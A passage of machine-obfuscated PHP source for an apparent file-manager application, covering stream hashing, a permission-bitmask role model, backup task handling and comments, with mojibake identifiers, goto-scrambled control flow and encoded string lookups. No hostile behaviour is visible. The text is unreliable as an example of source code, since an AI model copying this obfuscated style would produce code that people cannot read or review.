$this->sourceSize; } public function getContent($béÇ‹¤¹ÛÒ = false) { return $this->fileSubstr($béÇ‹¤¹ÛÒ, 0, $this->sourceSize); } public function fileSubstr($F‰­Âéñ¯ = false, $CÎ“ÏÅ‰ = 0, $Eä÷Ğœ© = 0) { if (!$Eä÷Ğœ©) { $Eä÷Ğœ© = $this->sourceSize; } $c†šºî¯ù = $this->sourceSize - $CÎ“ÏÅ‰; if ($Eä÷Ğœ© >= $c†šºî¯ù) { $Eä÷Ğœ© = $c†šºî¯ù; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $CÎ“ÏÅ‰, $Eä÷Ğœ©); } if ($this->sourceType == self::TYPE_FILE) { if ($Eä÷Ğœ© <= 0) { return $_SERVER[Â€Á›¨õ][33]; } $eª©»ãÅ¦´ = ftell($this->source); fseek_64($this->source, $eª©»ãÅ¦´ + $CÎ“ÏÅ‰); $fË¥¾ÑŒï„ = @fread($this->source, $Eä÷Ğœ©); fseek_64($this->source, $eª©»ãÅ¦´); return $fË¥¾ÑŒï„; } } public function hashMd5($c³¹÷·»ˆ = false) { return md5($this->getContent()); } public static function hash($fÕ§ò²ë…Ó, $Fò§ñ«¬‰ = 0) { $DéÖŒôİÒë = new PathDriverStream($fÕ§ò²ë…Ó, $Fò§ñ«¬‰); return $DéÖŒôİÒë->hashSimple($fÕ§ò²ë…Ó); } public static function md5($bÎ¦å²…Œî, $D‚œ½Ú²… = 0) { $Aéˆ‚¬Ş–à = new PathDriverStream($bÎ¦å²…Œî, $D‚œ½Ú²…); return $Aéˆ‚¬Ş–à->hashMd5($bÎ¦å²…Œî); } } goto bÛÑ¹°Â´ö; cÂ¾°ŞÃ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $bÈç¶«Æªğ =& $_SERVER[Â€Á›¨õ]; $b„Ë¯ßŠ²µ = array(array($bÈç¶«Æªğ[407] => LNG($bÈç¶«Æªğ[1665]), $bÈç¶«Æªğ[1666] => $bÈç¶«Æªğ[1667], $bÈç¶«Æªğ[1668] => 1, $bÈç¶«Æªğ[1669] => 1, $bÈç¶«Æªğ[1670] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($bÈç¶«Æªğ[407] => LNG($bÈç¶«Æªğ[1671]), $bÈç¶«Æªğ[1666] => $bÈç¶«Æªğ[1672], $bÈç¶«Æªğ[1668] => 2, $bÈç¶«Æªğ[1669] => 1, $bÈç¶«Æªğ[1670] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($bÈç¶«Æªğ[407] => LNG($bÈç¶«Æªğ[1673]), $bÈç¶«Æªğ[1666] => $bÈç¶«Æªğ[1674], $bÈç¶«Æªğ[1668] => 3, $bÈç¶«Æªğ[1669] => 1, $bÈç¶«Æªğ[1670] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($bÈç¶«Æªğ[407] => LNG($bÈç¶«Æªğ[1675]), $bÈç¶«Æªğ[1666] => $bÈç¶«Æªğ[1676], $bÈç¶«Æªğ[1668] => 4, $bÈç¶«Æªğ[1669] => 1, $bÈç¶«Æªğ[1670] => self::AUTH_SHOW | self::AUTH_VIEW), array($bÈç¶«Æªğ[407] => LNG($bÈç¶«Æªğ[1677]), $bÈç¶«Æªğ[1666] => $bÈç¶«Æªğ[1678], $bÈç¶«Æªğ[1668] => 5, $bÈç¶«Æªğ[1669] => 1, $bÈç¶«Æªğ[1670] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($bÈç¶«Æªğ[407] => LNG($bÈç¶«Æªğ[1679]), $bÈç¶«Æªğ[1666] => $bÈç¶«Æªğ[1680], $bÈç¶«Æªğ[1668] => 6, $bÈç¶«Æªğ[1669] => 1, $bÈç¶«Æªğ[1670] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($bÈç¶«Æªğ[407] => LNG($bÈç¶«Æªğ[1681]), $bÈç¶«Æªğ[1666] => $bÈç¶«Æªğ[1682], $bÈç¶«Æªğ[1668] => 7, $bÈç¶«Æªğ[1669] => 1, $bÈç¶«Æªğ[1670] => 0)); return $b„Ë¯ßŠ²µ; } public static function authCheck($Bå²–ƒ„¡ë, $aåŸ†İ˜™) { $Bå²–ƒ„¡ë = intval($Bå²–ƒ„¡ë); if ($GLOBALS[$_SERVER[Â€Á›¨õ][479]]) { return !0; } if ($Bå²–ƒ„¡ë <= 0) { return !1; } if (($Bå²–ƒ„¡ë & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Bå²–ƒ„¡ë & $aåŸ†İ˜™); } public static function authCheckShow($B‹·ÄÃ°º¼) { return self::authCheck($B‹·ÄÃ°º¼, self::AUTH_SHOW); } public static function authCheckView($EÛòØÕì¯) { return self::authCheck($EÛòØÕì¯, self::AUTH_VIEW); } public static function authCheckDownload($aÇˆªô¤Å¡) { return self::authCheck($aÇˆªô¤Å¡, self::AUTH_DOWNLOAD); } public static function authCheckUpload($b ‚±µ…í‰) { return self::authCheck($b ‚±µ…í‰, self::AUTH_UPLOAD); } public static function authCheckEdit($cÓ—òãàÎ) { return self::authCheck($cÓ—òãàÎ, self::AUTH_EDIT); } public static function authCheckRemove($E„š¸ÇŠ³¿) { return self::authCheck($E„š¸ÇŠ³¿, self::AUTH_REMOVE); } public static function authCheckShare($DŠ—éøº–) { return self::authCheck($DŠ—éøº–, self::AUTH_SHARE); } public static function authCheckComment($Dê‹ïçÀÜÓ) { return self::authCheck($Dê‹ïçÀÜÓ, self::AUTH_COMMENT); } public static function authCheckEvent($F¡ÑË·È¹æ) { return self::authCheck($F¡ÑË·È¹æ, self::AUTH_EVENT); } public static function authCheckRoot($EÚ•Ï´¤„õ) { return self::authCheck($EÚ•Ï´¤„õ, self::AUTH_ROOT); } public static function authCheckAction($AæªÓáŸáÆ, $cõÈ±Î×³â) { goto B½ÖÒ¢ëÈ°; B®¹×ôšŞí: if (($AæªÓáŸáÆ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($AæªÓáŸáÆ & $E®ëÍçâë¿); goto cÚÚì‘˜¤; AÕÊƒ© òÕ: $E®ëÍçâë¿ = $aÏ…ƒ§¶­[$cõÈ±Î×³â]; $AæªÓáŸáÆ = intval($AæªÓáŸáÆ); if ($AæªÓáŸáÆ <= 0) { return !1; } goto B®¹×ôšŞí; B½ÖÒ¢ëÈ°: $F‡Œ„àÒ…Û =& $_SERVER[Â€Á›¨õ]; $aÏ…ƒ§¶­ = array($F‡Œ„àÒ…Û[1683] => self::AUTH_VIEW, $F‡Œ„àÒ…Û[1068] => self::AUTH_DOWNLOAD, $F‡Œ„àÒ…Û[106] => self::AUTH_UPLOAD, $F‡Œ„àÒ…Û[1631] => self::AUTH_EDIT, $F‡Œ„àÒ…Û[1630] => self::AUTH_REMOVE, $F‡Œ„àÒ…Û[1641] => self::AUTH_SHARE, $F‡Œ„àÒ…Û[350] => self::AUTH_COMMENT, $F‡Œ„àÒ…Û[1490] => self::AUTH_EVENT, $F‡Œ„àÒ…Û[1684] => self::AUTH_ROOT); if (!isset($aÏ…ƒ§¶­[$cõÈ±Î×³â])) { return; } goto AÕÊƒ© òÕ; cÚÚì‘˜¤: } public static function authDisable($E„¥ç…ÄÕ”, $a—…ğëˆ´ß) { if (intval($E„¥ç…ÄÕ”) <= 0) { return 0; } return intval($E„¥ç…ÄÕ”) & ~$a—…ğëˆ´ß; } public $optionType = "\123\x79\x73\x74\145\x6d\56\163\157\x75\x72\143\x65\x41\165\164\x68\114\151\163\164"; public $field = array("\156\141\155\145", "\x61\x75\x74\x68", "\x6c\141\142\x65\154", "\x64\x69\163\x70\x6c\141\x79", "\163\x79\163\164\x65\155", "\x73\157\162\x74"); public function initData() { $b£óë·ã›´ = $this->authDefault(); foreach ($b£óë·ã›´ as $bâ»‘ÓÈë) { $this->add($bâ»‘ÓÈë); } } public function listData($e˜Ì´Æ‡ˆ = false, $AŠÇˆéÁö¥ = "\x73\157\x72\164", $E¯êœµÖ¥ = false) { return parent::listData($e˜Ì´Æ‡ˆ, $AŠÇˆéÁö¥, $E¯êœµÖ¥); } public function update($c‘ƒŞµäà«, $b­áŞ—) { $CÒ—°¥ìËØ =& $_SERVER[Â€Á›¨õ]; $FŞ¿¹áÃÜï = parent::listData($c‘ƒŞµäà«); $Aˆñõ§ÑÆø = $this->findByName($b­áŞ—[$CÒ—°¥ìËØ[28]]); if (!$FŞ¿¹áÃÜï || $Aˆñõ§ÑÆø && $Aˆñõ§ÑÆø[$CÒ—°¥ìËØ[388]] != $FŞ¿¹áÃÜï[$CÒ—°¥ìËØ[388]]) { return !1; } $this->filterAuth($b­áŞ—[$CÒ—°¥ìËØ[400]]); return parent::update($c‘ƒŞµäà«, $b­áŞ—); } public function remove($cóçã÷¸×) { $d¾É“íŒß• = parent::listData($cóçã÷¸×); if (!$d¾É“íŒß• || $d¾É“íŒß•[$_SERVER[Â€Á›¨õ][1143]]) { return !1; } return parent::remove($cóçã÷¸×); } public function add($EŞ‰Óòİ†Œ = array()) { goto aÕ ô…—˜; aÕ ô…—˜: $F¸¦’¸ª• =& $_SERVER[Â€Á›¨õ]; if ($this->findByName($EŞ‰Óòİ†Œ[$F¸¦’¸ª•[28]])) { return !1; } $D¯…ŠøŸ³ã = array($F¸¦’¸ª•[28] => $F¸¦’¸ª•[33], $F¸¦’¸ª•[400] => 1, $F¸¦’¸ª•[1685] => $F¸¦’¸ª•[1674], $F¸¦’¸ª•[1686] => 1, $F¸¦’¸ª•[1143] => 0, $F¸¦’¸ª•[1687] => 0); goto e·…ÇÒåÀ·; e·…ÇÒåÀ·: $EŞ‰Óòİ†Œ = array_merge($D¯…ŠøŸ³ã, $EŞ‰Óòİ†Œ); $EŞ‰Óòİ†Œ[$F¸¦’¸ª•[1687]] = $this->getSort(); $this->filterAuth($EŞ‰Óòİ†Œ[$F¸¦’¸ª•[400]]); goto eÊÂœ—ùÉç; eÊÂœ—ùÉç: return parent::insert($EŞ‰Óòİ†Œ); goto c¥˜»‚É÷Ö; c¥˜»‚É÷Ö: } private function getSort() { $A¶˜‚ßåë¬ =& $_SERVER[Â€Á›¨õ]; $f¾‹ñ½Ø = parent::listData(); $b«á§å¹«Ã = array_to_keyvalue($f¾‹ñ½Ø, $A¶˜‚ßåë¬[33], $A¶˜‚ßåë¬[1687]); return empty($b«á§å¹«Ã) ? 0 : max($b«á§å¹«Ã) + 1; } private function filterAuth(&$Aé×§–ª‚) { goto F•·Ñâ÷®Ğ; cİš‚ìîö: foreach ($aÑÕ“õï…¸ as $cİÛäºñ‚) { if ($Aé×§–ª‚ & $cİÛäºñ‚) { $CŞßÛ¡»íš[] = $cİÛäºñ‚; } } if (in_array(self::AUTH_ROOT, $CŞßÛ¡»íš)) { $Aé×§–ª‚ = array_sum($aÑÕ“õï…¸); return; } $dæôØ«Ùºš = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto EŸØ‘Ò¢ãÀ; F•·Ñâ÷®Ğ: if (!$Aé×§–ª‚) { return; } $aÑÕ“õï…¸ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $CŞßÛ¡»íš = array(); goto cİš‚ìîö; EŸØ‘Ò¢ãÀ: foreach ($CŞßÛ¡»íš as $cİÛäºñ‚) { if (isset($dæôØ«Ùºš[$cİÛäºñ‚])) { $CŞßÛ¡»íš = array_merge($CŞßÛ¡»íš, $dæôØ«Ùºš[$cİÛäºñ‚]); } } $CŞßÛ¡»íš[] = self::AUTH_SHOW; $Aé×§–ª‚ = array_sum(array_unique($CŞßÛ¡»íš)); goto C÷¯‰œ±ĞÑ; C÷¯‰œ±ĞÑ: } public function sort($BÓ­ÈŸ‚ã½, $EÚÙ»©‘©×) { return parent::update($BÓ­ÈŸ‚ã½, $EÚÙ»©‘©×); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\x62\141\143\153\x75\160\114\x69\163\x74"; public $field = array("\151\x6f", "\156\x61\x6d\145", "\x73\x74\x61\x74\165\163", "\x63\x6f\x6e\164\145\x6e\x74", "\x72\145\x73\x75\154\x74", "\x74\151\155\145\106\162\157\x6d", "\164\151\155\x65\124\x6f"); public function config() { goto Fœ”ÆİĞ‹´; Fœ”ÆİĞ‹´: $Aƒù‚¾¼×õ =& $_SERVER[Â€Á›¨õ]; $c“àÎöÅÊ = Model($Aƒù‚¾¼×õ[1098])->get($Aƒù‚¾¼×õ[726]); $c“àÎöÅÊ = json_decode($c“àÎöÅÊ, !0); goto AìÂ«ï…Õ; a®ƒÕ…„÷Ü: Action($Aƒù‚¾¼×õ[1688])->taskInit(); $AŸãğğÈˆß = Model($Aƒù‚¾¼×õ[1689])->listData(); foreach ($AŸãğğÈˆß as $FÚšâ÷‡¤¨) { if ($FÚšâ÷‡¤¨[$Aƒù‚¾¼×õ[1143]] == $Aƒù‚¾¼×õ[86] && $FÚšâ÷‡¤¨[$Aƒù‚¾¼×õ[1490]] == $Aƒù‚¾¼×õ[1690]) { $D­¼„ÕÂª‰ = $FÚšâ÷‡¤¨; break; } } goto b‘ˆÖŒ×‹Ë; b‘ˆÖŒ×‹Ë: if (isset($D­¼„ÕÂª‰[$Aƒù‚¾¼×õ[195]])) { $D­¼„ÕÂª‰[$Aƒù‚¾¼×õ[195]] = json_decode($D­¼„ÕÂª‰[$Aƒù‚¾¼×õ[195]], !0); } if (isset($c“àÎöÅÊ[$Aƒù‚¾¼×õ[195]])) { $D­¼„ÕÂª‰[$Aƒù‚¾¼×õ[195]][$Aƒù‚¾¼×õ[1475]] = $c“àÎöÅÊ[$Aƒù‚¾¼×õ[195]]; unset($c“àÎöÅÊ[$Aƒù‚¾¼×õ[195]]); } return array_merge($D­¼„ÕÂª‰, $c“àÎöÅÊ); goto AµÂÏ»‚‚´; AìÂ«ï…Õ: $c“àÎöÅÊ = is_array($c“àÎöÅÊ) ? $c“àÎöÅÊ : array(); if (!isset($c“àÎöÅÊ[$Aƒù‚¾¼×õ[705]])) { $c“àÎöÅÊ[$Aƒù‚¾¼×õ[705]] = $Aƒù‚¾¼×õ[86]; } $D­¼„ÕÂª‰ = array(); goto a®ƒÕ…„÷Ü; AµÂÏ»‚‚´: } public function listData($e„İ¢”ß­ö = false, $BÑÀ–ÁöÂë = "\155\157\x64\151\x66\171\x54\x69\x6d\145", $cî§¤²òš = false) { return parent::listData($e„İ¢”ß­ö, $BÑÀ–ÁöÂë, !0); } public function lastItem() { $DğîçŸçŒ° = $this->listData(); return !empty($DğîçŸçŒ°[0]) ? $DğîçŸçŒ°[0] : null; } public function kill($eôà×„¡ñ…) { goto b‡¯ç™·¹Ò; c–°æš§¼°: return $this->remove($eôà×„¡ñ…); goto d¦Äİæ´¶â; aîÔ´Ë¢: Task::kill($e»÷¤ô¡Š[725]); Task::kill($e»÷¤ô¡Š[744]); Task::kill($e»÷¤ô¡Š[753]); goto cİÔ‘ƒŠôÌ; b‡¯ç™·¹Ò: $e»÷¤ô¡Š =& $_SERVER[Â€Á›¨õ]; $d­âÍï‡… = $this->listData($eôà×„¡ñ…); if (!$d­âÍï‡… || empty($d­âÍï‡…[$e»÷¤ô¡Š[28]])) { return !0; } goto aîÔ´Ë¢; cİÔ‘ƒŠôÌ: $bã‡âê‰µ« = $d­âÍï‡…[$e»÷¤ô¡Š[28]]; $FãñÍïºº‰ = TEMP_FILES . $e»÷¤ô¡Š[722] . $bã‡âê‰µ« . $e»÷¤ô¡Š[8]; IO::remove($FãñÍïºº‰, !1); goto c–°æš§¼°; d¦Äİæ´¶â: } public function remove($eàïØæÒ) { $b‚µÊ¾å´Í = $this->listData($eàïØæÒ); if (!$b‚µÊ¾å´Í) { return !0; } return $this->backupRemove($b‚µÊ¾å´Í); } private function backupRemove($b™é÷¼ŒÛ×) { $FÁŒÎ­ÄİÂ =& $_SERVER[Â€Á›¨õ]; parent::remove($b™é÷¼ŒÛ×[$FÁŒÎ­ÄİÂ[388]]); $DŒÅâ“‰ÈÚ = "\x7b\x69\x6f\x3a{$b™é÷¼ŒÛ×[$FÁŒÎ­ÄİÂ[704]]}\175\x2f\144\x61\164\x61\x62\141\163\145\57\x62\x61\143\153\x75\x70\137" . $b™é÷¼ŒÛ×[$FÁŒÎ­ÄİÂ[28]]; IO::remove($DŒÅâ“‰ÈÚ, !1); return !0; } public function start() { goto b™äÆÌ‘ëš; b™äÆÌ‘ëš: $a‡“Â¢Ç =& $_SERVER[Â€Á›¨õ]; if ($GLOBALS[$a‡“Â¢Ç[6]][$a‡“Â¢Ç[87]][$a‡“Â¢Ç[1691]] != $a‡“Â¢Ç[86]) { return !0; } $bŠÌÙ›°¥ = $this->config(); goto CóŞä“ö; fññÅ†–: if ($Cò©È¶İ÷) { $Cò©È¶İ÷ = $d†ÕÃõÈ„Ê->dbFile(); if ($Cò©È¶İ÷ && $bŠÌÙ›°¥[$a‡“Â¢Ç[705]] == $a‡“Â¢Ç[491]) { $Cò©È¶İ÷ = $d†ÕÃõÈ„Ê->file(); } } Backup::set(array($a‡“Â¢Ç[702] => 1, $a‡“Â¢Ç[470] => time())); return !0; goto c›ëŠ› ­; CóŞä“ö: if (!$bŠÌÙ›°¥ || $bŠÌÙ›°¥[$a‡“Â¢Ç[1472]] != $a‡“Â¢Ç[86]) { return !1; } $FïŒ³òê§É = $this->process(); foreach ($FïŒ³òê§É as $F¤ëˆ™ ½ ) { if ($F¤ëˆ™ ½ ) { return Task::restart($F¤ëˆ™ ½ [$a‡“Â¢Ç[388]]); } } goto e£¡Â¿˜¤·; e£¡Â¿˜¤·: $d†ÕÃõÈ„Ê = new Backup(); $d†ÕÃõÈ„Ê->keep(); $Cò©È¶İ÷ = $d†ÕÃõÈ„Ê->db(); goto fññÅ†–; c›ëŠ› ­: } public function process() { $aŠññ—©‚æ =& $_SERVER[Â€Á›¨õ]; return array($aŠññ—©‚æ[707] => Task::get($aŠññ—©‚æ[725]), $aŠññ—©‚æ[710] => Task::get($aŠññ—©‚æ[744]), $aŠññ—©‚æ[173] => Task::get($aŠññ—©‚æ[753])); } public function restore() { $Cè÷‡®Îà‚ =& $_SERVER[Â€Á›¨õ]; ActionCall($Cè÷‡®Îà‚[993], !0, 1); ActionCall($Cè÷‡®Îà‚[993], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\155\x65" => "\143\157\x6d\155\x65\x6e\x74\137\155\145\x74\x61", "\155\145\164\x61\x46\151\145\x6c\144" => "\x63\x6f\x6d\x6d\145\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Cô•ßØ¨‘ì) { $BµˆÆİÕÑŸ =& $_SERVER[Â€Á›¨õ]; if ($Cô•ßØ¨‘ì[$BµˆÆİÕÑŸ[1692]]) { $Aì§ÆŞïŒ× = $this->where(array($BµˆÆİÕÑŸ[1693] => $Cô•ßØ¨‘ì[$BµˆÆİÕÑŸ[1692]]))->find(); if (!$Aì§ÆŞïŒ× || $Aì§ÆŞïŒ×[$BµˆÆİÕÑŸ[398]] != $Cô•ßØ¨‘ì[$BµˆÆİÕÑŸ[398]] || $Aì§ÆŞïŒ×[$BµˆÆİÕÑŸ[478]] != $Cô•ßØ¨‘ì[$BµˆÆİÕÑŸ[478]]) { return !1; } $this->where(array($BµˆÆİÕÑŸ[1693] => $Cô•ßØ¨‘ì[$BµˆÆİÕÑŸ[1692]]))->setAdd($BµˆÆİÕÑŸ[1694], 1); } $Cô•ßØ¨‘ì[$BµˆÆİÕÑŸ[1695]] = 0; $Cô•ßØ¨‘ì[$BµˆÆİÕÑŸ[1694]] = 0; $Cô•ßØ¨‘ì[$BµˆÆİÕÑŸ[702]] = 1; return $this->add($Cô•ßØ¨‘ì); } public function commentCount($Aöì„Ó…, $DÅ¸ê¾ÕÒ…) { goto dˆÈ—íÒ·; d»à¬æšŒÏ: $cÉæ…µàâ = array($e¿ò£ô×”¦[478], $e¿ò£ô×”¦[1696] => $e¿ò£ô×”¦[474]); $EÉÀÂÂãÉÛ = array($e¿ò£ô×”¦[478] => array($e¿ò£ô×”¦[7], $Aöì„Ó…), $e¿ò£ô×”¦[398] => $DÅ¸ê¾ÕÒ…); $BÁ»Àì•»¥ = $this->field($cÉæ…µàâ)->where($EÉÀÂÂãÉÛ)->group($e¿ò£ô×”¦[478])->select(); goto E¤ôÒ·ª; E¤ôÒ·ª: return array_to_keyvalue($BÁ»Àì•»¥, $e¿ò£ô×”¦[478], $e¿ò£ô×”¦[474]); goto AØ·íŞŠ; dˆÈ—íÒ·: $e¿ò£ô×”¦ =& $_SERVER[Â€Á›¨õ]; if (!$Aöì„Ó…) { return array(); } if (is_string($Aöì„Ó…) || is_int($Aöì„Ó…)) { $Aöì„Ó… = array($Aöì„Ó…); } goto d»à¬æšŒÏ; AØ·íŞŠ: } public function remove($b¨Ñ½óËÑì) { $eáå²Ûï˜¾ =& $_SERVER[Â€Á›¨õ]; $D»Ü¯•èÆ = array($eáå²Ûï˜¾[1693] => $b¨Ñ½óËÑì); $DÄê…ÃÉ‘¹ = $this->where($D»Ü¯•èÆ)->find(); if ($DÄê…ÃÉ‘¹[$eáå²Ûï˜¾[1692]]) { $this->where(array($eáå²Ûï˜¾[1693] => $DÄê…ÃÉ‘¹[$eáå²Ûï˜¾[1692]]))->setAdd($eáå²Ûï˜¾[1694], -1); } return $this->where($D»Ü¯•èÆ)->delete(); } public function edit($F›ĞŸö­Ö‰, $e•à±—Ô° ) { $eœ»Ø‚ƒ¬· =& $_SERVER[Â€Á›¨õ]; $BƒÕËÕ¯¦Ó = array($eœ»Ø‚ƒ¬·[1693] => $F›ĞŸö­Ö‰); return $this->where($BƒÕËÕ¯¦Ó)->save(array($eœ»Ø‚ƒ¬·[1697] => $e•à±—Ô° )); } public function prasise($cŠ¹Š¢”çä) { $C’øÜ’ÍÏ =& $_SERVER[Â€Á›¨õ]; $Aèà…•ù£Œ = Model($C’øÜ’ÍÏ[1698]); $dö®›°É¯ = array($C’øÜ’ÍÏ[1693] => $cŠ¹Š¢”çä, $C’øÜ’ÍÏ[1493] => USER_ID); $b¦—­Ÿ‹ªù = $Aèà…•ù£Œ->where($dö®›°É¯)->find(); if (!$b¦—­Ÿ‹ªù) { $Aèà…•ù£Œ->add($dö®›°É¯); $aíÙ°ÑËê½ = $this->where(array($C’øÜ’ÍÏ[1693] => $cŠ¹Š¢”çä))->setAdd($C’øÜ’ÍÏ[1695], 1); } else { $Aèà…•ù£Œ->where($dö®›°É¯)->delete(); $aíÙ°ÑËê½ = $this->where(array($C’øÜ’ÍÏ[1693] => $cŠ¹Š¢”çä))->setAdd($C’øÜ’ÍÏ[1695], -1); } return $aíÙ°ÑËê½; } public function targetInfo($b–¨äæÊ, $D ƒ§â°ìï) { goto CÊÓòêíÜ¹; A„æ‚·¯¬: $e†¹¿×‚» = "\122\111\x47\x48\124\40\112\x4f\111\116\x20{$this->tablePrefix}\143\x6f\155\155\x65\x6e\x74\137\160\x72\x61\151\163\145\x20\163\164\x61\x72\x20\x6f\156\x20\143\x6f\155\x6d\x65\156\164\x2e\143\x6f\x6d\155\145\156\164\111\x44\x20\75\x20\163\x74\141\162\x2e\143\x6f\x6d\155\145\x6e\164\111\x44"; $F«—äó– = $this->alias($a¦Ñ“›´Î•[350])->where($Fáè«Ç¿ÕÓ)->join($e†¹¿×‚», $a¦Ñ“›´Î•[1699])->count(); $Aä¶àõÂäÉ = array($a¦Ñ“›´Î•[1700] => $BÉÒÍç‡ãÂ, $a¦Ñ“›´Î•[1701] => $F«—äó–); goto EÂ†”º‡ë¿; CÊÓòêíÜ¹: $a¦Ñ“›´Î• =& $_SERVER[Â€Á›¨õ]; $Fáè«Ç¿ÕÓ = array($a¦Ñ“›´Î•[544] => $b–¨äæÊ, $a¦Ñ“›´Î•[545] => $D ƒ§â°ìï); $BÉÒÍç‡ãÂ = $this->where($Fáè«Ç¿ÕÓ)->count(); goto A„æ‚·¯¬; EÂ†”º‡ë¿: return $Aä¶àõÂäÉ; goto fß¡•‚¿; fß¡•‚¿: } public function listData($EË¥ œÕ‹) { $dÊå„êÊ£¹ =& $_SERVER[Â€Á›¨õ]; if (isset($EË¥ œÕ‹[$dÊå„êÊ£¹[1702]])) { if ($EË¥ œÕ‹[$dÊå„êÊ£¹[1702]]) { $EË¥ œÕ‹[$dÊå„êÊ£¹[1703]] = array($dÊå„êÊ£¹[946], intval($EË¥ œÕ‹[$dÊå„êÊ£¹[1702]])); } unset($EË¥ œÕ‹[$dÊå„êÊ£¹[1702]]); } if (isset($EË¥ œÕ‹[$dÊå„êÊ£¹[1704]])) { if ($EË¥ œÕ‹[$dÊå„êÊ£¹[1704]]) { $EË¥ œÕ‹[$dÊå„êÊ£¹[1703]] = array($dÊå„êÊ£¹[943], intval($EË¥ œÕ‹[$dÊå„êÊ£¹[1704]])); } unset($EË¥ œÕ‹[$dÊå„êÊ£¹[1704]]); } return $this->_listData($EË¥ œÕ‹); } private function _listData($b¥šÓïÓšÚ) { $CöÇòöŒ‰Ô =& $_SERVER[Â€Á›¨õ]; $Fˆ¸ãì¯ = $this->where($b¥šÓïÓšÚ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Fˆ¸ãì¯[$CöÇòöŒ‰Ô[365]]); $this->_listAppendUser($Fˆ¸ãì¯[$CöÇòöŒ‰Ô[365]]); $this->_listAppendMeta($Fˆ¸ãì¯[$CöÇòöŒ‰Ô[365]]); return $Fˆ¸ãì¯; } private function _makeOrder() { $fäò´¿‰Ö… =& $_SERVER[Â€Á›¨õ]; $E…Şç«Üí = array($fäò´¿‰Ö…[1695], $fäò´¿‰Ö…[1694], $fäò´¿‰Ö…[192]); $a·®º¼ŸÇÄ = Input::get($fäò´¿‰Ö…[429], $fäò´¿‰Ö…[7], $fäò´¿‰Ö…[410], $E…Şç«Üí); $Fçß…¯ßŞ† = Input::get($fäò´¿‰Ö…[430], $fäò´¿‰Ö…[7], $fäò´¿‰Ö…[1495], array($fäò´¿‰Ö…[1705], $fäò´¿‰Ö…[425])); $CäÒ±¸Šª = $a·®º¼ŸÇÄ . $fäò´¿‰Ö…[50] . $Fçß…¯ßŞ†; return $this->order($CäÒ±¸Šª); } private function _listAppendParent(&$fŸ‚ŸïÀöï) { goto E«³¦‘©¥á; e÷™ì…¦Î: if (!$F’ô…©”Õ) { return; } $e®‡å›Ãèí = $this->where(array($fâ´²¸Ÿ§¸[1693] => array($fâ´²¸Ÿ§¸[7], $F’ô…©”Õ)))->select(); $e®‡å›Ãèí = array_to_keyvalue($e®‡å›Ãèí, $fâ´²¸Ÿ§¸[1703]); goto Eç‡í›ó—Ó; E«³¦‘©¥á: $fâ´²¸Ÿ§¸ =& $_SERVER[Â€Á›¨õ]; $F’ô…©”Õ = array_unique(array_to_keyvalue($fŸ‚ŸïÀöï, $fâ´²¸Ÿ§¸[33], $fâ´²¸Ÿ§¸[1692])); $F’ô…©”Õ = array_remove_value($F’ô…©”Õ, $fâ´²¸Ÿ§¸[491]); goto e÷™ì…¦Î; Eç‡í›ó—Ó: foreach ($fŸ‚ŸïÀöï as &$FŠˆ§„‰š) { if (isset($e®‡å›Ãèí[$FŠˆ§„‰š[$fâ´²¸Ÿ§¸[1692]]])) { $FŠˆ§„‰š[$fâ´²¸Ÿ§¸[1706]] = $e®‡å›Ãèí[$FŠˆ§„‰š[$fâ´²¸Ÿ§¸[1692]]]; } } unset($FŠˆ§„‰š); goto Aê¿Ë¦›ñÆ; Aê¿Ë¦›ñÆ: } private function _listAppendUser(&$C×‘Èç›©) { goto FÁÀâ†Ş; D´ğ‹¨ğäÁ: foreach ($C×‘Èç›© as &$fäá’¹Ú Õ) { $fäá’¹Ú Õ[$Dé¡İ·ˆ‘‚[557]] = $C½·ø²ºÜä[$fäá’¹Ú Õ[$Dé¡İ·ˆ‘‚[1501]]]; if (isset($fäá’¹Ú 